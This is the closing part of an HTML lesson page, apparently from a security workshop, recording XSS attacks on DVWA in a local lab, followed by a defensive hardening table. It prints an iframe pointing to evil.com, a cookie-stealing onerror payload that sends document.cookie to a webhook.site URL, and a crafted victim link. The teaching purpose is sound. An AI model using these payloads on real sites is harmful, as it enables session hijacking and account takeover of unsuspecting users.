+                  HTML Injection occurs when an application accepts user-supplied input without sanitization and renders it directly inside the Document Object Model (DOM). While it is often considered a precursor to Cross-Site Scripting (XSS), pure HTML injection does not execute arbitrary JavaScript. Instead, it allows attackers to alter the visual layout, inject fake login dialogs (phishing), or deface web pages.
+                </p>
+                <p>We tested a basic injection string in the input field:</p>
+                <pre><code>&lt;b&gt;TheWH2&lt;/b&gt;</code></pre>
+                <p>
+                  Rather than outputting the literal string <code>&amp;lt;b&amp;gt;TheWH2&amp;lt;/b&amp;gt;</code>, the browser interpreted the tags as raw markup and rendered <strong>TheWH2</strong> in bold text. This confirmed that the server failed to apply <code>htmlspecialchars()</code> or context-appropriate character escaping before printing the response.
+                </p>
+
+                <!-- 9. Reflected XSS -->
+                <h2 id="xss-reflected">9. Reflected XSS: &lt;script&gt;alert(1)&lt;/script&gt;</h2>
+                <p>
+                  Building upon HTML injection, we evaluated <strong>Reflected Cross-Site Scripting (XSS)</strong> on DVWA at:
+                </p>
+                <pre><code>http://192.168.1.141/dvwa/vulnerabilities/xss_r/</code></pre>
+                <p>
+                  In Reflected XSS, the injected script is reflected off the web server in an immediate HTTP response (typically via a URL parameter). The script is not stored permanently in the database; it executes only when a victim clicks a maliciously crafted link.
+                </p>
+                <p>We injected the classic proof-of-concept payload:</p>
+                <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                <p>
+                  The browser immediately executed the JavaScript payload, spawning a popup dialog displaying <code>1</code>. This confirmed execution of arbitrary client-side code in the context of the user's browser session.
+                </p>
+
+                <!-- 10. Stored XSS & Client-Side Limit Bypass -->
+                <h2 id="xss-stored-bypass">10. Stored XSS &amp; Client-Side Limit Bypass</h2>
+                <p>
+                  Unlike Reflected XSS, <strong>Stored XSS (Persistent XSS)</strong> stores the malicious payload permanently inside the application's backend database (e.g. inside guestbooks, comment sections, or user profile names). Every time any user visits the page, the database retrieves and renders the payload, executing the script automatically on every visitor's browser.
+                </p>
+                <p>
+                  We navigated to the DVWA Guestbook endpoint:
+                </p>
+                <pre><code>http://192.168.1.141/dvwa/vulnerabilities/xss_s/</code></pre>
+
+                <h3>The Client-Side Obstacle: Character Limit</h3>
+                <p>
+                  When attempting to type our payload into the <strong>Name</strong> input field, the browser stopped accepting characters after 10 letters. Inspecting the HTML source code revealed a client-side restriction:
+                </p>
+                <pre><code>&lt;input name="txtName" type="text" size="30" maxlength="10"&gt;</code></pre>
+
+                <h3>The Bypass Technique (Inspect Element)</h3>
+                <p>
+                  Client-side restrictions enforced by HTML attributes provide zero true security. An ethical hacker has full control over the client execution environment:
+                </p>
+                <ol>
+                  <li>Right-clicked the <em>Name</em> input box and selected <strong>Inspect Element</strong>.</li>
+                  <li>Located the attribute <code>maxlength="10"</code> in the DOM tree.</li>
+                  <li>Double-clicked the attribute and changed it to <code>maxlength="1000"</code> (or deleted the attribute entirely).</li>
+                  <li>Pressed <strong>Enter</strong> to apply the change in the local DOM.</li>
+                </ol>
+                <p>
+                  With the client-side limitation removed, we pasted our full payload, submitted the form, and the payload was written directly to the database. Upon every subsequent page refresh, the stored script executed automatically!
+                </p>
+
+                <!-- 11. iFrame Injection & Webhook.site Session Stealing -->
+                <h2 id="iframe-session-hijacking">11. iFrame Injection &amp; Webhook.site Session Stealing</h2>
+                <p>
+                  While <code>alert(1)</code> confirms vulnerability presence, ethical penetration testers demonstrate real business risk through weaponized Proof-of-Concepts (PoCs), such as UI redressing and <strong>Session Hijacking (Account Takeover)</strong>.
+                </p>
+
+                <h3>Concept A: iFrame Injection</h3>
+                <p>
+                  We demonstrated how injecting an inline frame allows attackers to overlay external malicious content or phishing interfaces seamlessly inside the legitimate web application:
+                </p>
+                <pre><code>&lt;iframe src="http://evil.com/" width="500" height="300"&gt;&lt;/iframe&gt;</code></pre>
+
+                <h3>Concept B: Setting Up External Listener (Webhook.site)</h3>
+                <p>
+                  To capture stolen session tokens out-of-band without setting up a dedicated public VPS server, instructors <strong>Birendra Sah</strong> and <strong>Bishal Shrestha</strong> introduced <a href="https://webhook.site/" target="_blank" rel="noopener noreferrer">Webhook.site</a>. It provides a unique, disposable URL that logs every incoming HTTP request (headers, query parameters, and client IPs) in real-time.
+                </p>
+
+                <h3>Concept C: Cookie Stealing Payload via Image Object</h3>
+                <p>
+                  We constructed an image error-handling payload that dynamically instantiates a JavaScript <code>Image()</code> object and appends the victim's <code>document.cookie</code> as a query parameter to our Webhook URL:
+                </p>
+
+                <div class="code-block-wrapper">
+                  <pre><code>&lt;img src="x" onerror="var img = new Image(); img.src='https://webhook.site/ad18e687-2939-4d4c-9bdd-db9d7b5364cd/?cookie=' + encodeURIComponent(document.cookie);"&gt;</code></pre>
+                </div>
+
+                <h3>Concept D: Instructor's Reflected URL Exploit Demonstration</h3>
+                <p>
+                  Instructor <strong>Birendra Sah</strong> demonstrated how this attack is weaponized against unsuspecting victims via a single URL-encoded link:
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Crafted Malicious Link Sent to Victim</span>
+                  </div>
+                  <div class="terminal-body">
+                    <div class="command-output">http://192.168.1.141/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22x%22+onerror%3D%22var+img+%3D+new+Image%28%29%3B+img.src%3D%27https%3A%2F%2Fwebhook.site%2F89a954c5-6523-42ae-afd5-03e02e389e93%2F%3Fcookie%3D%27+%2B+encodeURIComponent%28document.cookie%29%3B%22%3E#</div>
+                  </div>
+                </div>
+
+                <div class="row g-3 my-3">
+                  <div class="col-md-6">
+                    <div class="p-3 border rounded bg-light h-100">
+                      <h5 class="fw-bold mb-2 text-primary"><i class="bi bi-person-slash"></i> Victim's Experience</h5>
+                      <p class="small text-muted mb-0">
+                        The victim clicks the link, which opens their trusted DVWA internal page. The broken image tag (<code>src="x"</code>) fails silently, but the <code>onerror</code> event triggers instantly in the background. The victim notices nothing abnormal on the screen.
+                      </p>
+                    </div>
+                  </div>
+                  <div class="col-md-6">
+                    <div class="p-3 border rounded bg-light h-100">
+                      <h5 class="fw-bold mb-2 text-danger"><i class="bi bi-box-arrow-in-right"></i> Attacker's Harvest</h5>
+                      <p class="small text-muted mb-0">
+                        Inside Webhook.site, an incoming HTTP GET request appears immediately with the victim's active session token:
+                        <br><code>?cookie=security%3Dlow%3B%20PHPSESSID%3Dff1bb41c0a0d051dd7bdc0d5c082deb5</code>
+                        <br>The attacker copies this <code>PHPSESSID</code>, pastes it into their own browser cookie editor, and achieves complete <strong>Account Takeover</strong> without knowing the victim's password!
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- 12. Defensive Hardening -->
+                <h2 id="defense-remediation">12. Defensive Hardening: PDO, Encoding &amp; HttpOnly</h2>
+                <p>
+                  Understanding exploitation is only half of an ethical hacker's responsibility. The most crucial component is communicating effective defensive engineering countermeasures to developers and sysadmins:
+                </p>
+
+                <div class="table-responsive">
+                  <table class="table table-bordered table-hover">
+                    <thead class="table-dark">
+                      <tr>
+                        <th>Vulnerability</th>
+                        <th>Root Cause</th>
+                        <th>Defensive Engineering Solution</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Brute Force Attacks</strong></td>
+                        <td>Unlimited login attempts, lack of account lockouts or rate-limiting.</td>
+                        <td>Implement progressive account lockouts, IP rate-limiting via reverse proxy (Nginx/Cloudflare), multi-factor authentication (MFA), and CAPTCHA.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>SQL Injection (CWE-89)</strong></td>
+                        <td>Concatenating raw user inputs into SQL query strings.</td>
+                        <td>Use <strong>Prepared Statements and Parameterized Queries</strong> via PHP PDO or MySQLi. Never concatenate variables into SQL strings.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>XSS &amp; HTML Injection (CWE-79)</strong></td>
+                        <td>Untrusted user inputs rendered into the DOM without escaping.</td>
+                        <td>Apply context-aware output encoding using <code>htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</code> and implement modern front-end frameworks (React/Angular) that auto-escape DOM nodes.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Session Hijacking via XSS</strong></td>
+                        <td>Session cookies accessible by client-side JavaScript (<code>document.cookie</code>).</td>
+                        <td>Set the <strong><code>HttpOnly</code></strong> flag on sensitive session cookies (preventing JS from reading them) along with <strong><code>Secure</code></strong> and <strong><code>SameSite=Strict</code></strong> flags. Deploy a strict <strong>Content Security Policy (CSP)</strong>.</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <!-- 13. Day 5 Key Takeaways -->
+                <h2 id="day5-takeaways">13. Day 5 Summary &amp; Key Takeaways</h2>
+                <div class="callout-box">
+                  <ul class="mb-0">
+                    <li><strong>Authentication Auditing:</strong> Burp Suite Intruder's Sniper attack is an indispensable utility for targeted single-position dictionary attacks against login forms.</li>
+                    <li><strong>Automated Database Exploitation:</strong> SQLMap demonstrates that once a parameter is vulnerable to SQLi, entire database clusters can be mapped, extracted, and decrypted in minutes if proper database privilege segregation is absent.</li>
+                    <li><strong>Client-Side Security is an Illusion:</strong> HTML restrictions like <code>maxlength</code> or hidden form fields can be modified or removed in seconds via Browser DevTools. All data validation must be strictly enforced on the server.</li>
+                    <li><strong>The Lethality of XSS:</strong> Cross-Site Scripting is far more dangerous than simple popups. When combined with an external listener like Webhook.site, it enables instantaneous session hijacking and unauthorized administrative control.</li>
+                    <li><strong>Defense-in-Depth:</strong> Protecting user sessions requires combining secure coding (parameterized queries &amp; output encoding) with cookie hardening (<code>HttpOnly</code>, <code>SameSite</code>) and Content Security Policies.</li>
+                  </ul>
+                </div>
+
+                <!-- Ethical Use & Legal Warning Notice -->
+                <div
+                  class="p-3 my-4 rounded border border-danger bg-danger bg-opacity-10 d-flex align-items-start gap-3">
+                  <div class="text-danger fs-2" style="line-height: 1;">
+                    <i class="bi bi-exclamation-triangle-fill"></i>
+                  </div>
+                  <div>
+                    <h5 class="fw-bold text-danger mb-1" style="font-size: 16px;">
+                      WARNING: Strictly For Educational &amp; Defensive Purposes Only
+                    </h5>
+                    <p class="mb-0 text-dark small" style="line-height: 1.6;">
+                      All automated SQLMap testing, Burp Suite brute-force attacks, and XSS session stealing proof-of-concepts documented in this report were performed strictly within an authorized, isolated local virtual laboratory environment (DVWA on Metasploitable 2). Attempting automated attacks, credential dumping, or injecting malicious scripts into unauthorized web applications without explicit written permission is illegal under the Electronic Transactions Act (ETA) of Nepal and international cyber law. TheWH2 and BugXploit promote ethical, responsible offensive security research.
+                    </p>
+                  </div>
+                </div>
+
+              </div><!-- .article-content -->
+
+              <!-- Bottom Navigation -->
+              <div class="lesson-nav-buttons">
+                <a href="../day4/index.html" class="btn btn-outline-secondary">
+                  <i class="bi bi-arrow-left"></i> Previous: Day 4
+                </a>
+                <a href="../index.html" class="btn btn-primary">
+                  <i class="bi bi-grid-fill"></i> Workshop Overview
+                </a>
+              </div>
+
+            </article>
+
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Lesson Detailed Content -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="copyright">
+        &copy; 2026 <strong><span>The WH2</span></strong>. All Rights Reserved
+      </div>
+      <div class="credits">
+        Designed with Security by <a href="../../../index.html">The WH2</a>
+      </div>
+    </div>
+  </footer><!-- End Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="../../../assets/vendor/aos/aos.js"></script>
+  <script src="../../../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="../../../assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="../../../assets/vendor/swiper/swiper-bundle.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="../../../assets/js/main.js"></script>
+
+  <!-- Automatic Clipboard Copy Button for all code blocks -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const codeBlocks = document.querySelectorAll('.lesson-article pre');
+
+      codeBlocks.forEach(function (pre) {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'code-block-wrapper';
+        pre.parentNode.insertBefore(wrapper, pre);
+        wrapper.appendChild(pre);
+
+        const copyBtn = document.createElement('button');
+        copyBtn.className = 'code-copy-btn';
+        copyBtn.setAttribute('type', 'button');
+        copyBtn.setAttribute('title', 'Copy code to clipboard');
+        copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+
+        copyBtn.addEventListener('click', function () {
+          const codeText = pre.innerText.trim();
+          navigator.clipboard.writeText(codeText).then(function () {
+            copyBtn.classList.add('copied');
+            copyBtn.innerHTML = '<i class="bi bi-check-lg"></i>';
+            setTimeout(function () {
+              copyBtn.classList.remove('copied');
+              copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+            }, 2000);
+          }).catch(function (err) {
+            console.error('Failed to copy: ', err);
+          });
+        });
+
+        wrapper.appendChild(copyBtn);
+      });
+    });
+  </script>
+
+</body>
+
+</html>
